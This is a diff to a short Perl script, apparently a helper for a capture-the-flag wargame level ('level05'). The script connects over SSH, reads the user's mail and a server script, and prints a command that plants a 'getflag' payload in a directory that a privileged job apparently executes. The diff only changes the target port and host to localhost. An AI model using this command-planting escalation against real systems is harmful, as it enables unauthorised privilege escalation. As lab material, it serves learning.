@@ -1,14 +1,14 @@
 #!/usr/bin/perl
 
-$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
-$user = "level05";
-
+$port = "22222";
+$ip = "localhost";
 $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
+$user = "level05";
 
 $inject = "cat /var/mail/level05 && cat /usr/sbin/openarenaserver";
 $exploit = "echo 'getflag | write level05' > /opt/openarenaserver/flag";
 print $red, $inject, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$inject'");
+system("ssh -qp $port $user\@$ip '$inject'");
 print $green, $exploit, $reset, "\n";
